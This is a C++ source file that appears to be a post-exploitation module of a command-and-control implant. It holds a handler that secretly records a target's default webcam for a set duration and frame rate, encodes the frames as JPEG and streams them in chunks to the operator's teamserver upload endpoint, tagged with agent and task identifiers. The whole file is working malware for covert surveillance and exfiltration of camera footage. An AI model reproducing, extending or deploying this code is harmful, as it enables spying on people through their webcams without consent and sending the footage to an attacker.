// record_camera: one-shot camera recording.
//
// Captures the default webcam at the requested FPS for the requested
// duration, encodes each frame as JPEG, and posts the frames in chunks
// to the teamserver's /api/upload/stream endpoint. The teamserver
// reassembles the chunks into a final MJPEG artifact.
//
// Args: [duration_s=10, fps=10, jpeg_quality=70, width=640, height=480, frames_per_chunk=10]

#include "../json.hpp"
#include "../protocol.h"
#include "registry.h"
#include "stream_common.h"
#include "camera_session.h"

#include <chrono>
#include <thread>

namespace nagomio_modules {

std::string handle_record_camera(const std::vector<std::string>& args) {
    int duration_s = nagomio_stream::parse_int_arg(args, 0, 10);
    int fps        = nagomio_stream::parse_int_arg(args, 1, 10);
    int jpeg_quality = nagomio_stream::parse_int_arg(args, 2, 70);
    int req_w      = nagomio_stream::parse_int_arg(args, 3, 640);
    int req_h      = nagomio_stream::parse_int_arg(args, 4, 480);
    int frames_per_chunk = nagomio_stream::parse_int_arg(args, 5, 10);
    if (duration_s < 1) duration_s = 1;
    if (duration_s > 300) duration_s = 300;
    if (frames_per_chunk < 1) frames_per_chunk = 1;
    if (frames_per_chunk > 30) frames_per_chunk = 30;
    if (jpeg_quality < 1) jpeg_quality = 1;
    if (jpeg_quality > 100) jpeg_quality = 100;

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    nagomio_camera::CameraSession session;
    if (!nagomio_camera::open(session, req_w, req_h)) {
        return std::string("{\"error\":\"failed to open camera\"}");
    }

#ifdef _WIN32
    if (session.ctrl) session.ctrl->Run();
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
#endif

    auto frame_capture = [&](int /*frame_idx*/, int& out_w, int& out_h,
                              std::vector<unsigned char>& out_rgb) -> bool {
        return nagomio_camera::pull_frame(session, out_rgb, out_w, out_h);
    };

    auto stats = nagomio_stream::run_capture_loop(
        agent_id, task_id, std::move(frame_capture),
        fps, duration_s, frames_per_chunk, jpeg_quality);

    nagomio_camera::close(session);

    nlohmann::json j = {
        {"type",         "record_camera"},
        {"duration_s",   duration_s},
        {"fps",          fps},
        {"quality",      jpeg_quality},
        {"frame_count",  stats.frame_count},
        {"chunk_count",  stats.chunk_count},
        {"width",        stats.width},
        {"height",       stats.height},
        {"total_bytes",  static_cast<uint64_t>(stats.total_bytes)},
        {"elapsed_ms",   static_cast<uint64_t>(stats.elapsed_ms)},
        {"stopped_by_flag", stats.stopped_by_flag},
    };
    if (!stats.last_error.empty()) j["warning"] = stats.last_error;
    return j.dump();
}

} // namespace nagomio_modules
